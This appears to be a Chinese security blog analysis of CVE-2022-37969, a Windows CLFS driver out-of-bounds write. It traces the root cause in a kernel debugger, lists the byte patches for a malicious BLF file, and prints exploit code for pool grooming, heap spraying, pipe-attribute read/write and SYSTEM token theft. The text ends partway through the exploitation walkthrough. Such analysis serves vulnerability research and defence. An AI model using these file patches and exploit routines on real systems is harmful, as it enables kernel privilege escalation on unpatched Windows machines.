# CVE-2022-37969 clfs漏洞分析与利用

CVE-2022-37969是通用日志文件系统驱动clfs中的越界写入漏洞,通过该漏洞,可以完成提权.

## 1.clfs结构

clfs是一个通用日志记录的子系统,在内核模式和用户模式都可以使用它来构建日志.在基本日志文件blf中生成日志.

通过CreateLogFile创建和打开blf文件.

日志文件由6个不同的元数据块组成,和其对应的shadow用于备份的块,每个元数据块都以CLFS Log Block Header开头.

![image](https://image.3001.net/images/20230814/1692003185_64d9eb7111dee7e3ce657.png!small)

SignaturesOffset字段是存储所有扇区签名的内存数组的偏移,日志在编码时每个0x200字节的最后2个字节被签名覆盖,被覆盖前的数据在SignaturesOffset字段记录的偏移的内存中,.解码时,将其中保存的数据写入原位置.

RecordOffsets是日志块内记录的偏移量数组.

    
    
    typedef struct _CLFS_LOG_BLOCK_HEADER
    {
        UCHAR MajorVersion;
        UCHAR MinorVersion;
        UCHAR Usn;
        CLFS_CLIENT_ID ClientId;
        USHORT TotalSectorCount;
        USHORT ValidSectorCount;
        ULONG Padding;
        ULONG Checksum;
        ULONG Flags;
        CLFS_LSN CurrentLsn;
        CLFS_LSN NextLsn;
        ULONG RecordOffsets[16];
        ULONG SignaturesOffset;
    } CLFS_LOG_BLOCK_HEADER, *PCLFS_LOG_BLOCK_HEADER;
    

BaseBlock位于blf文件偏移0x800的位置,到偏.移0x71ff结束.以长度位0x70的CLFS Log Block Header日志块标头开始.

后面跟着的则是基记录表头,结构如下

![image](https://image.3001.net/images/20230814/1692003201_64d9eb81eba5d05fc50ce.png!small)

![image](https://image.3001.net/images/20230814/1692003210_64d9eb8ae65a9cf2eb421.png!small)

里面有几个字段需要关注下:

rgClients表示指向客户端上下文对象的偏移量数组

rgContainers表示指向容器对象的上下文数组

cbSymbolZone表示符号区域中新符号的下一个可用偏移量

客户端上下文的结构

    
    
    typedef struct _CLFS_CLIENT_CONTEXT
    {
        CLFS_NODE_ID cidNode;
        CLFS_CLIENT_ID cidClient;
        USHORT fAttributes;
        ULONG cbFlushThreshold;
        ULONG cShadowSectors;
        ULONGLONG cbUndoCommitment;
        LARGE_INTEGER llCreateTime;
        LARGE_INTEGER llAccessTime;
        LARGE_INTEGER llWriteTime;
        CLFS_LSN lsnOwnerPage;
        CLFS_LSN lsnArchiveTail;
        CLFS_LSN lsnBase;
        CLFS_LSN lsnLast;
        CLFS_LSN lsnRestart;
        CLFS_LSN lsnPhysicalBase;
        CLFS_LSN lsnUnused1;
        CLFS_LSN lsnUnused2;
        CLFS_LOG_STATE eState; //+0x78
        union
        {
            HANDLE hSecurityContext;
            ULONGLONG ullAlignment;
        };
    } CLFS_CLIENT_CONTEXT, *PCLFS_CLIENT_CONTEXT;
    

容器上下文的结构

    
    
    typedef struct _CLFS_CONTAINER_CONTEXT
    {
        CLFS_NODE_ID cidNode; //8 bytes
        ULONGLONG cbContainer; //8 bytes
        CLFS_CONTAINER_ID cidContainer; // 4 bytes
        CLFS_CONTAINER_ID cidQueue; // 4 bytes
        union
        {
            CClfsContainer* pContainer; //8 bytes
            ULONGLONG ullAlignment;
        };
        CLFS_USN usnCurrent;
        CLFS_CONTAINER_STATE eState;
        ULONG cbPrevOffset; //4 bytes
        ULONG cbNextOffset; //4 bytes
    } CLFS_CONTAINER_CONTEXT, *PCLFS_CONTAINER_CONTEXT;
    

其中字段pContainer是指向运行时容器CClfsContainer对象内核指针,位于容器上下文结构中偏移0x18的位置.

CClfsLogFcbPhysical 类与 CClfsBaseFilePersisted 类的部分结构。

其中m_rgBlocks在CClfsBaseFilePersisted类偏移为0x30的位置,这是一个大小为0x90的结构,控制器从文件赋值块的内容时,CLFS_METADATA_BLOCK保存了每个块的大小,起始偏移量,内核地址.

    
    
    typedef struct struct_CClfsLogFcbPhysical{
        void* vftable; //offset 0x00                                        vftable 指针
        UCHAR* pLogName; //offset 0x30                                        存储的是指向日志名称的指针
        CClfsBaseFilePersisted,* pCClfsBaseFilePersisted; //offset 0x2a8(windows 11 是 0x2b0)        存储的是指向 CClfsBaseFilePersisted 类的 this 指针
    } CClfsLogFcbPhysical,*pCClfsLogFcbPhysical;
    
    typedef struct struct_CClfsBaseFilePersisted{
        Heap* m_rgBlocks; //offset 0x30                                             size 0x90,指向 CLFS_CONTROL_RECORD 中的 CLFS_METADATA_BLOCK 数组
        CClfsContainer* pContainer; //offset 0x98(windows 11 是 0x1C0)        存储的是指向 CClfsContainer 对象的指针
    } CClfsBaseFilePersisted,*pCClfsBaseFilePersisted;
    //6个CLFS_METADATA_BLOCK分别对应6个元数据块.
    typedef struct m_rgBlocks{
        CLFS_METADATA_BLOCK block0;
        CLFS_METADATA_BLOCK block1;
        CLFS_METADATA_BLOCK block2;
        CLFS_METADATA_BLOCK block3;
        CLFS_METADATA_BLOCK block4;
        CLFS_METADATA_BLOCK block0;
    }
    typedef struct CLFS_METADATA_BLOCK{
        PUCHAR pbImage;
        ULONG cbImage;
        ULONG cbOffset;
        CLFS_METADATA_BLOCK_TYPE eBlockType;
    }
    
    //Heap 的大小为 0x90 bytes
    typedef struct struct_Heap{
        CLFS_LOG_BLOCK_HEADER *pCLFS_LOG_BLOCK_HEADER; //offset 0x30        存储指向基块的指针
    } Heap,*pHeap;
    

## 2.poc分析

运行poc,bsod发生在CLFS!CClfsBaseFilePersisted::RemoveContainer中,通过栈回溯,可以看出应该是在清理CClfsContainer对象时发生了崩溃,rdi寄存器中的地址不可访问,造成了bsod.

![image](https://image.3001.net/images/20230814/1692003226_64d9eb9adf1c5649d4a13.png!small)

这里的rdi寄存器实际上指向了CLFS_CONTAINER_CONTEXT+0x18的位置,也就是CClfsContainer对象的指针,但是这个指针由于被破坏掉,后面读取的时候,发生了崩溃.

![image](https://image.3001.net/images/20230814/1692003343_64d9ec0fcea0bba8fcc00.png!small)

![image](https://image.3001.net/images/20230814/1692003351_64d9ec175acf2b9966fb9.png!small)

poc创建了MyLog.blf后,进行了如下修改.

    
    
    0x80C 	0				checksum
    0x868 	50000000		SignaturesOffset
    0x9a8	301b0000		reClients
    0x1b98	4b110100		cbSymbolZone
    0x2390	b81b0000		
    0x2394	301b0000
    0x23a0	07f0fdc188
    0x23ab	01000000
    0x2418	20000000
    

为了定位到原因,首先bp CLFS!CClfsRequest::AllocContainer在添加容器请求时下断,看看后面是如何处理物理日志的.

内部调用了CClfsLogFcbPhysical::AllocContainer->CClfsBaseFilePersisted::AddContainer

![image](https://image.3001.net/images/20230814/1692003359_64d9ec1faf31fd58b79f1.png!small)

CClfsBaseFilePersisted可以参考之前的结构

偏移0x2b0处为CClfsBaseFilePersisted的指针

CClfsBaseFilePersisted偏移0x30是结构m_rgBlocks,0x1c0位置是pContainer

    
    
    bp clfs!CClfsLogFcbPhysical::AllocContainer
    
    
    
    1: kd> dps poi(rcx+2b0)
    ffffdd84`caecc000  fffff801`24673820 CLFS!CClfsBaseFilePersisted::`vftable'
    ffffdd84`caecc008  ffffffff`00000001
    ffffdd84`caecc010  00000000`00000000
    ffffdd84`caecc018  00005b58`00000000
    ffffdd84`caecc020  ffffdd84`ccbce910
    ffffdd84`caecc028  00000000`00000006
    ffffdd84`caecc030  ffffdd84`cb157de0	//m_blocks
    ffffdd84`caecc038  ffffdd84`cbe3a5d0
    ffffdd84`caecc040  ffffbb0d`6db14088
    ffffdd84`caecc048  00000001`0000000b
    ffffdd84`caecc050  ffffdd84`caecc000
    

根据上面的结构,可以找到BaseBlock在内存中的位置.

    
    
    1: kd> dps ffffdd84`cb157de0
    ffffdd84`cb157de0  00000000`00000000 m_blocks[0] Control Block
    ffffdd84`cb157de8  00000000`00000400
    ffffdd84`cb157df0  00000000`00000000
    ffffdd84`cb157df8  00000000`00000000 m_blocks[1] Control Block shadow
    ffffdd84`cb157e00  00000400`00000400
    ffffdd84`cb157e08  00000000`00000001
    ffffdd84`cb157e10  ffffbb0d`6db14000 m_blocks[2] Base Block
    ffffdd84`cb157e18  00000800`00007a00
    ffffdd84`cb157e20  00000000`00000002
    ffffdd84`cb157e28  ffffbb0d`6db14000
    ffffdd84`cb157e30  00008200`00007a00
    ffffdd84`cb157e38  00000000`00000003
    ffffdd84`cb157e40  00000000`00000000
    ffffdd84`cb157e48  0000fc00`00000200
    ffffdd84`cb157e50  00000000`00000004
    ffffdd84`cb157e58  00000000`00000000
    

![image](https://image.3001.net/images/20230814/1692003370_64d9ec2a6c05f02c23c4b.png!small)

为了搞清楚CClfsContainer指针中的数据为什么会被破坏,需要在相关的位置下断分析.

CClfsBaseFilePersisted+0x1c0位置和_CLFS_CONTAINER_CONTEXT+0x18的位置,因为里面都有CClfsContainer指针.

_CLFS_CONTAINER_CONTEXT结构查找:

先执行到此处,把容器添加成功

![image](https://image.3001.net/images/20230814/1692003380_64d9ec34730e0c2a5d709.png!small)

然后找到rgContainers中记录的偏移

    
    
    0: kd> dd ffffbb0d`6db14000+398
    ffffbb0d`6db14398  00001468 00000000 00000000 00000000
    ffffbb0d`6db143a8  00000000 00000000 00000000 00000000
    ffffbb0d`6db143b8  00000000 00000000 00000000 00000000
    ffffbb0d`6db143c8  00000000 00000000 00000000 00000000
    ffffbb0d`6db143d8  00000000 00000000 00000000 00000000
    ffffbb0d`6db143e8  00000000 00000000 00000000 00000000
    ffffbb0d`6db143f8  00000000 00000000 00000000 00000000
    ffffbb0d`6db14408  00000000 00000000 00000000 00000000
    

然后Base
Block+LogBlockHeader的偏移+rgContainers记录偏移+CLFS_CONTAINER_CONTEXT中的pContainer元素偏移,就找到了.

    
    
    0: kd> dps poi(ffffbb0d`6db14000+0x70+0x1468+0x18)
    ffffbb0d`6b4d2440  fffff801`24673800 CLFS!CClfsContainer::`vftable'
    ffffbb0d`6b4d2448  00000000`00080000
    ffffbb0d`6b4d2450  00000000`00000000
    ffffbb0d`6b4d2458  00000000`00000000
    ffffbb0d`6b4d2460  ffffffff`80001830
    ffffbb0d`6b4d2468  ffffdd84`ccbce260
    ffffbb0d`6b4d2470  ffffdd84`ccb67270
    ffffbb0d`6b4d2478  00000000`00000001
    ffffbb0d`6b4d2480  00001000`00000000
    ffffbb0d`6b4d2488  00000000`00000200
    ffffbb0d`6b4d2490  00000000`00000000
    ffffbb0d`6b4d2498  00000000`00000000
    ffffbb0d`6b4d24a0  00000000`00000000
    ffffbb0d`6b4d24a8  00000000`00000000
    ffffbb0d`6b4d24b0  ffffbb0d`6b4d2440
    ffffbb0d`6b4d24b8  00000000`00000000
    

然后对这两个目标下写入断点

    
    
    0: kd> ba w4 ffffbb0d`6db14000+0x70+0x1468+0x18
    0: kd> ba w4 ffffe481`8c7e3000+0x1c0
    

中断在了CLFS!CClfsLogFcbPhysical::AllocContainer处

此时BaseBlock->LogBlockHeader中SignaturesOffset字段已经发生了修改.

需要注意的是,poc中进行的修改是将SignaturesOffset设置为50000000的.这里的值应该是00000050,此时SignaturesOffset字段在内存中的值却是ffff0050,原因会在后面展开分析.

![image](https://image.3001.net/images/20230814/1692003497_64d9eca9cce400df057bb.png!small)

f5继续运行,中断在了此CLFS!memset+0x3b的位置.此时CLFS_CONTAINER_CONTEXT结构中的数据被直接写入,造成了内部指针的损坏,指向了未知的数据.

    
    
    fffff801`2466cc78 0f1101               movups  xmmword ptr [rcx], xmm0
    fffff801`2466cc7b 4c03c1               add     r8, rcx	//中断在此处
    

![image](https://image.3001.net/images/20230814/1692003509_64d9ecb53957a6097cad1.png!small)

当前的调用堆栈,可以推测是在处理Symbol相关字段的时候出现了问题.

    
    
    1: kd> k
     # Child-SP          RetAddr               Call Site
    00 ffff8182`754c33f8 fffff801`2469e4ac     CLFS!memset+0x3b
    01 ffff8182`754c3400 fffff801`246a1251     CLFS!CClfsBaseFilePersisted::AllocSymbol+0x6c
    02 ffff8182`754c3430 fffff801`2469c517     CLFS!CClfsBaseFile::FindSymbol+0x185
    03 ffff8182`754c3490 fffff801`2469aef4     CLFS!CClfsBaseFilePersisted::AddSymbol+0x6b
    04 ffff8182`754c3510 fffff801`2469aaf8     CLFS!CClfsBaseFilePersisted::AddContainer+0xdc
    05 ffff8182`754c35c0 fffff801`246b02fc     CLFS!CClfsLogFcbPhysical::AllocContainer+0x148
    06 ffff8182`754c3660 fffff801`2468dd45     CLFS!CClfsRequest::AllocContainer+0x22c
    07 ffff8182`754c3710 fffff801`2468d857     CLFS!CClfsRequest::Dispatch+0x351
    08 ffff8182`754c3760 fffff801`2468d7a7     CLFS!ClfsDispatchIoRequest+0x87
    09 ffff8182`754c37b0 fffff801`2065d925     CLFS!CClfsDriver::LogIoDispatch+0x27
    0a ffff8182`754c37e0 fffff801`20a762b2     nt!IofCallDriver+0x55
    0b ffff8182`754c3820 fffff801`20a770ac     nt!IopSynchronousServiceTail+0x1d2
    0c ffff8182`754c38d0 fffff801`20a76ab6     nt!IopXxxControlFile+0x5dc
    0d ffff8182`754c3a00 fffff801`20823775     nt!NtDeviceIoControlFile+0x56
    0e ffff8182`754c3a70 00007ffb`e2bc2dc4     nt!KiSystemServiceCopyEnd+0x25
    0f 000000a3`99dde5c8 00007ffb`e04a3eeb     0x00007ffb`e2bc2dc4
    10 000000a3`99dde5d0 0000022c`9aa35240     0x00007ffb`e04a3eeb
    11 000000a3`99dde5d8 0000022c`9a950000     0x0000022c`9aa35240
    12 000000a3`99dde5e0 00000000`00000002     0x0000022c`9a950000
    13 000000a3`99dde5e8 00007ffb`e2b644b3     0x2
    14 000000a3`99dde5f0 000000a3`99dde620     0x00007ffb`e2b644b3
    15 000000a3`99dde5f8 0000022c`8007a808     0x000000a3`99dde620
    16 000000a3`99dde600 0000022c`9c3b1480     0x0000022c`8007a808
    17 000000a3`99dde608 000000a3`0000005e     0x0000022c`9c3b1480
    18 000000a3`99dde610 000000a3`99dde6e8     0x000000a3`0000005e
    19 000000a3`99dde618 00000000`00000008     0x000000a3`99dde6e8
    1a 000000a3`99dde620 00000000`00000027     0x8
    1b 000000a3`99dde628 00000000`00000000     0x27
    

CLFS!CClfsBaseFilePersisted::AllocSymbol函数中首先通过通过GetBaseLogRecord获取CLFS_BASE_RECORD_HEADER结构,然后加偏移+0x1328(0x870+0x1328),取到cbSymolZone的数据.然而cbSymolZone字段在poc中是进行了篡改的,值为0001114b.

然后开始对cbSymbolZone字段做了一些验证,判断是否大于signaturesOffset,大于直接返回异常了.

然而前面signaturesOffset已经被修改为了0xffff0050了,所以这里的验证直接被绕过了,导致后面可以执行到memset,导致CClfsContainer中的指针发生损坏.

写入的地址则是BASE_RECORD_HEADER+0001114b+0x1338.

![image](https://image.3001.net/images/20230814/1692003521_64d9ecc15e3877acc7cf6.png!small)

    
    
    1: kd> dd rdi+1328
    ffffbb0d`6db04398  0001114b 00000000 03030000 00000001
    ffffbb0d`6db043a8  c1fdf006 00000030 02d20016 000000b8
    ffffbb0d`6db043b8  00000000 00000000 00000000 00000000
    ffffbb0d`6db043c8  000013f0 00001368 00000000 00000000
    ffffbb0d`6db043d8  c1fdf007 00000088 01000000 00009c40
    ffffbb0d`6db043e8  00000000 00000000 00000000 00000000
    ffffbb0d`6db043f8  00000000 01100000 00000000 00000000
    ffffbb0d`6db04408  00000000 00000000 00000000 ffffffff
    

如果signaturesOffset字段如果没有被篡改,这里的验证是无法通过的,所以关键就在于signaturesOffset是如何被篡改的.

在之前的调试中,AddLogContainer之前,signaturesOffset的值就已经被篡改了,在poc中上一个调用的函数是CreateLogFile.对应的clfs对数据块的处理过程如下

CClfsRequest::Create->CClfsLogFcbPhysical::Initialize->CClfsBaseFilePersisted::OpenImage->CClfsBaseFilePersisted::ReadImage->CClfsBaseFile::AcquireMetadataBlock->CClfsBaseFilePersisted::ReadMetadataBlock

ReadMetadataBlock函数,这个函数被循环调用,申请指定大小的内存,将每个block的数据读取到CClfsBaseFilePersisted->m_rgBlocks中,总共6个元数据块.

![image](https://image.3001.net/images/20230814/1692003641_64d9ed39851f97d39cf53.png!small)  
ClfsDecodeBlock用于解析_CLFS_LOG_BLOCK_HEADER.在里面应该可以看到对signaturesOffset的处理.

![image](https://image.3001.net/images/20230814/1692003651_64d9ed434700189aa9128.png!small)

在内部又调用了 ClfsDecodeBlockPrivate.可以看出它是在进行解码,覆盖每个扇区的签名,还原为原数据.

![image](https://image.3001.net/images/20230814/1692003666_64d9ed52bfb4f1e146d98.png!small)

之前分析到漏洞是因为signaturesOffset被篡改引起的,现在我们找到了一个合适下断分析的位置,我们直接在ReadMetadataBlock处理BaseBlock的时候对signaturesOffset下个写入断点就可以了

在ReadMetadataBlock执行到了第三次的时候申请的长度为0x7a00的内存池,就是BaseBlock,此时对目标进行下断.

![image](https://image.3001.net/images/20230814/1692003678_64d9ed5e111bb5758efa9.png!small)

    
    
    ba w8 0xffffd4858453b000+0x68
    

首先在CLFS!ClfsEncodeBLockPrivate函数里,被正常设置为了0x50

![image](https://image.3001.net/images/20230814/1692003688_64d9ed68179b05556f6af.png!small)

而后在第二次执行CLFS!ClfsEncodeBLockPrivate时,向高位写入了0xFFFF.导致当前的值变为了0xFFFF0050.可以看下伪代码,这里扇区的签名是0xffff,EnCode时进行了覆盖.导致signaturesOffset变为了0xffff0050,而当前eax的值为0xe,也就是说它是从偏移0x200*0xe-8的位置取的扇区签名,所以要搞清楚这块baseblock+0x200*0xe-8内存是怎么被修改的.

![image](https://image.3001.net/images/20230814/1692003707_64d9ed7be96d4432cd638.png!small)

![image](https://image.3001.net/images/20230814/1692003717_64d9ed853d04dca5cd990.png!small)

![image](https://image.3001.net/images/20230814/1692003726_64d9ed8e50409977f3e2c.png!small)

下面重新运行下系统,对这块内存下断点

    
    
    ba w8 0xffffc20c5e2b9000+0x200*0xe-8
    

中断在了ResetLog函数中,是它将这块内存设置为了0xffffffff00000000,在伪代码中可以看到,扇区签名位于最后4个字节偏移1bfc处,而这里的数据CLFS_LSN_INVALID为8个字节,从偏移1bf8处开始覆盖.所以值被覆盖为了0xffff0050.

![image](https://image.3001.net/images/20230814/1692003735_64d9ed977d67d8857d54a.png!small)

![image](https://image.3001.net/images/20230814/1692003748_64d9eda40caa4a6df2caa.png!small)

栈回溯到上一层,看看为什么会调用ResetLog.

在CClfsLogFcbPhysical::Initialize中将CLFS_CLIENT_CONTEXT结构体中的eState作为判断条件执,如果为false,会执行给到ResetLog.

这个结构体由CClfsBaseFile::AcquireClientContext进行填充,用于获取客户端上下文对象.

![image](https://image.3001.net/images/20230814/1692003758_64d9edae8ddca7a68838e.png!small)

![image](https://image.3001.net/images/20230814/1692003769_64d9edb9c27093343eaab.png!small)

调用过程如下

    
    
    CClfsBaseFile::AcquireClientContext
    CClfsBaseFile::GetSymbol(this, v8, v4, clientContext)
    clientContext = CClfsBaseFile::OffsetToAddr((#456 *)this);
    

再来看下poc进行的修改,它对reClients客户端偏移上下文进行了修改,0x1b30+0x870=0x23a0,并在0x23a0处伪造了一个客户端上下文.在这个伪造的客户端上下文结构中,在偏移为0x78处的eState字段设置为了0x20.所以在AcquireClie.ntContext获取伪造的客户端上下文对象后,才会执行到ResetLog,才会导致SignaturesOffset被覆盖.

    
    
    0x80C 	0				checksum
    0x868 	50000000		SignaturesOffset
    0x9a8	301b0000		reClients
    0x1b98	4b110100		cbSymbolZone
    0x2390	b81b0000		
    0x2394	301b0000
    0x23a0	07f0fdc188
    0x23ab	01000000
    0x2418	20000000
    

现在,已经分析清楚了漏洞原因,用户可以通过构造虚假上下文,通过异常值最终覆盖掉SignaturesOffset,在对SignaturesOffset与cbSymbolZone进行检查时不严格,导致发生了任意地址的越界写入.导致CClfsContainer指针的数据被损坏,在释放时触发异常.

## 3.漏洞利用

### exp中使用的技巧

1.通过CreatePipe创建一个匿名管道,可以获得一个读取句柄和一个写入句柄.

然后调用NtFsControlFile将FsControlCode设置为0x11003c和0x110038可以管道创建属性和读取属性值,可以用于构造任意地址读写.

PipeAttribute结构:

    
    
    Flink				0x0
    Blink				0x8
    AttributeNawme 		0x10
    AttributeValueSize 	0x18
    AttributeValue		0x20
    data				0x28
    

2._ETHREAD内核对象中偏移0x232处PreviousMode存储了先前模式,如果将先前模式修改为0,则可以绕过一些函数对先前模式的检查,通过NtWriteVirtualMemory直接修改内核的内存.

3.system进程eprocess内核地址的获取和需要提权进程eprocess内核地址的获取,在之前分析afd内核漏洞利用的时候遇到过,exp中使用的方法同样也是通过未导出的nt函数_NtQuerySystemInformation,通过对句柄的索引进行对比,找到对应的内核对象.

    
    
    SIZE_T GetObjectKernelAddress(HANDLE Object)
    {
    	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    	ULONG	handleInfoSize = 0x1000;
    	ULONG	retLength;
    	NTSTATUS status;
    	SIZE_T kernelAddress = 0;
    	BOOL bFind = FALSE;
    	while (TRUE)
    	{
    		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
    		status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
    		if (status == 0xC0000004 || NT_SUCCESS(status)) // STATUS_INFO_LENGTH_MISMATCH
    		{
    			LocalFree(handleInfo);
    			handleInfoSize = retLength + 0x100;
    			handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
    
    			status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
    
    			if (NT_SUCCESS(status))
    			{
    				for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++)
    				{
    					if ((USHORT)Object == 0x4)
    					{
    						if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
    						{
    
    							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
    							bFind = TRUE;
    							break;
    						}
    					}
    					else
    					{
    						if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
    						{
    							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
    							bFind = TRUE;
    							break;
    						}
    					}
    				}
    			}
    		}
    		if (handleInfo)
    			LocalFree(handleInfo);
    		if (bFind)
    			break;
    	}
    	return kernelAddress;
    }
    

### exp分析

#### 1.%public%/目录下创建日志文件MyLog.blf.然后循环创建10个这样的日志文件.

然后使用了一个方法确保baseblock在内存池中偏移一致:

在每次新创建完一个日志文件后,会执行函数getBigPoolInfo.

在getBigPoolInfo中调用函数NtQuerySystemInformation,将查询参数设置为SystemBigPoolInformation,获取所有bigpool内存结构.然后筛选出池tag为"Clfs",大小为0x7a00的baseblock池.然后依次检查每个基本块之间的偏移是否一致的,如果不一致,会继续循环,直到一致为止.

    
    
    do
    				{
    					HANDLE logFile1;
    					do
    					{
    						v26 = v24;
    						memset(buf, 0, 0x1000);
    						unsigned int rnum = rand();
    						wsprintfW((LPWSTR)buf, L"%s_%d", stored_env_fname, rnum);
    						logFile1 = CreateLogFile((LPWSTR)buf, 0xc0010000, 3, 0, 4, 0);
    					} while (logFile1 == (HANDLE)-1);
    
    					int* handleArray = (INT*)malloc(4);
    					*handleArray = (INT)logFile1;
    					getBigPoolInfo(p_a2); // SystemBigPoolInformation
    					//		printf("[+] Last BigPoolAddress of Clfs tag --> %p\n [+]Total Clfs tags --> 0x%x\n", a2, num_of_CLFS);
    
    					v24 = p_a2[0];
    
    
    				} while (!v26);
    

![image](https://image.3001.net/images/20230814/1692003817_64d9ede96074930cbdd11.png!small)

#### 2.在exp中制作了一个精心构造的日志文件,这个文件在前面分析过了,然后修复了crc验证.

![image](https://image.3001.net/images/20230814/1692003832_64d9edf822f37d26f7fef.png!small)

#### 3.开始布局堆喷

在地址0x5000000申请了长度0x100000的内存空间.

然后在地址0x10000申请了长度为0x1000000的内存,然后在0x10000内存中每隔10个字节写入地址0x5000000.

    
    
    int doHeapSpray() {
    
    	UINT64 alloc00 = 0x5000000;
    	if (!VirtualAlloc((LPVOID)alloc00, 0x100000, 0x3000, 4)) {
    		printf("[-] Failed to allocate memory\n");
    		return 0;
    	}
    	if (!VirtualAlloc((LPVOID)0x10000, 0x1000000, 0x3000, 4)) {
    		DWORD lastError = GetLastError();
    		printf("[-] Failed to allocate memory at address 0x1000\n");
    		return 0;
    	}
    	for (int i = 0; i < 0x1000000; i += 0x10)
    		*(UINT64*)(i + 0x10000) = 0x5000000;
    	printf("[+] Successful allocated at 0x10000\n");
    	//	getchar();
    	return 0;
    }
    

内存如下

addr| val  
---|---  
0x10000| 0x5000000  
0x10008| 0  
0x10010| 0x5000000  
0x10018| 0  
......| ........  
0x100fff0| 0x5000000  
  
创建了缓冲区大小为0x1000的匿名管道,而后使用NtFsControlFile函数,传入codeL0x11003c,向管道中添加属性.

就像前面寻找clfs的bigbool一样,这里使用了同样的方法去寻找管道属性的内核地址.

![image](https://image.3001.net/images/20230814/1692003848_64d9ee08eea9d8b7db7de.png!small)

然后在0xffffffff地址申请了长度为0x100000的内存.

0xffffffff内存地址写入system_eprocess&0xfffffffffffff000

在0x100000007处将内存修改为0x414141414141005A.

从0x10008处开始,每隔10个字节写入pipeAttribute->AttributeValueSize字段.

当前堆喷结构如下

addr| val  
---|---  
0x10000| 0x5000000  
0x10008| AttributeValueSize_ptr  
0x10010| 0x5000000  
.......| ..........  
0xffffffff| system_eprocess&0xfffffffffffff000  
0x100000007| 0x414141414141005A  
......| .........  
0x1000FFFF8| AttributeValueSize_ptr  
  
然后获取了函数ClfsEarlierLsn和SeSetAccessStateGenericMapping的偏移,找到了通过实际的加载基址获取了在ring0中的位置.

![image](https://image.3001.net/images/20230814/1692003863_64d9ee171019ff179b3a7.png!small)

#### 4.提权

最终的提权函数是pipeArbitraryWrite,需要注意是这个函数执行了2次,触发了2次漏洞完成了提权,下面详细分析下:

    
    
    int pipeArbitraryWrite() {
    	HANDLE v51 = 0;
    
    	if (fnClfsEarlierLsn)
    	{
    		*(PUINT64)(0x5000018) = fnClfsEarlierLsn;
    		*(PUINT64)(0x5000000) = 0x123456789;
    		*(PUINT64)(0x5000008) = fnSeSetAccessStateGenericMapping;
    
    		if (flag == 1) {
    			//Arranging the memory for second attempt
    
    			*(UINT64*)dest2 = System_token_value;
    			*(UINT64*)dest3 = next_token;
    			UINT64 Token_address_current_minus_8 = g_EProcessAddress + 0x4b8 - 8;
    
    			printf("ADDRESS of MY PROCESSS TOKEN -8= %p\n", Token_address_current_minus_8);
    
    
    			for (int i = 8; i < 0x1000000; i += 0x10)
    			{
    				*(UINT64*)(i + 0x10000) = (UINT64)Token_address_current_minus_8;
    			}
    
    			*(UINT64*)(0x5000000) = 0x123456789;
    			*(UINT64*)(0x5000018) = fnClfsEarlierLsn;
    			*(UINT64*)(0x5000008) = fnSeSetAccessStateGenericMapping;
    		}
    
    		v51 = CreateLogFile(stored_env_fname, 0xC0010000, 3u, 0i64, 4, 0); // 0xc0010000 
    		srand(time(NULL));
    		int v53 = rand();
    		WCHAR* v25 = (WCHAR*)malloc(0x1000);
    		WCHAR* v85 = v25;
    		memset(v25, 0, 0x1000);
    		wsprintfW(v85, L"%s_%d", stored_env_xfname, v53);
    		HANDLE v55 = CreateLogFile(v85, GENERIC_READ | GENERIC_WRITE | DELETE, 3u, 0i64, 4u, 0); //gets a handle of MyLogxxx.blf
    		printf("OK handle 55 0x%x\n", v55);
    		if (v55 == (HANDLE)-1i64) {
    			//       printf("Choose name fail ---> Duplicate\n");
    			exit(1);
    		}
    		LONGLONG pcbContainer = 512;
    		//  int v56 = rand();
    		WCHAR pwszContainerPath[768] = { 0 };
    		WCHAR pwszContainerPath2[768] = { 0 };
    		WCHAR pwszContainerPath3[768] = { 0 };
    		if (flag == 0) {
    			wsprintfW(pwszContainerPath, stored_env_containerfname);
    		}
    		else {
    			wsprintfW(pwszContainerPath, stored_env_containerfname2);
    		}
    		printf("pwszContainerPath: %ls\n", pwszContainerPath);
    
    
    		if (!AddLogContainer(v55, (PULONGLONG)&pcbContainer, pwszContainerPath, 0i64)) {
    			CloseHandle(v55);
    			CloseHandle(v51);
    
    			exit(1);
    		}
    		pcbContainer = 512;
    		srand(time(NULL));
    		UINT v56 = rand();
    		wsprintfW(pwszContainerPath, stored_env_containerfname);
    		AddLogContainer(v51, (PULONGLONG)&pcbContainer, pwszContainerPath, 0i64); // Crash !
    
    		char v33[16] = { 0 };
    		char v28[4] = {};
    		v28[0] = 1;
    
    		typedef NTSTATUS func(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
    		func* _NtSetInformationFile = (func*)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtSetInformationFile");
    
    		NTSTATUS setresult = _NtSetInformationFile(v55, (PIO_STATUS_BLOCK)v33, v28, 1i64, (FILE_INFORMATION_CLASS)13);
    		VOID* dest = malloc(0x100);
    		memset(dest, 0x42, 0xff);
    
    		void* v9b = _malloc_base(0x2000);
    
    		int v29 = 90;
    		_NtFsControlFile(hReadPipe[0], 0, 0, 0, &v30, 0x110038, &v29, 2, v9b, 0x2000);
    		PUINT64 v27 = (PUINT64)((char*)v9b + v14 + 0x4b8);
    		if (v27 == 0) { exit(1); };
    		System_token_value = *v27;
    		next_token = v27[1];
    		printf("SYSTEM TOKEN VALUE= %p\n", System_token_value);
    		if (System_token_value == 0x4141414141414141) {
    
    			printf("Failed attempt try again..\n");
    			exit(1234);
    
    		}
    	}
    	flag++;
    	return 0;
    }
    

**第一次触发:**

首先将0x5000008地址设置为SeSetAccessStateGenericMapping函数,0x5000018地址设置为ClfsEarlierLsn函数,

然后便开始触发漏洞,在RemoveContainer函数时,此时的rdi应该指向的是虚假的CClfsContainer对象的位置.在后续的代码中,会主动调用函数ClfsEarlierLsn和SeSetAccessStateGenericMapping

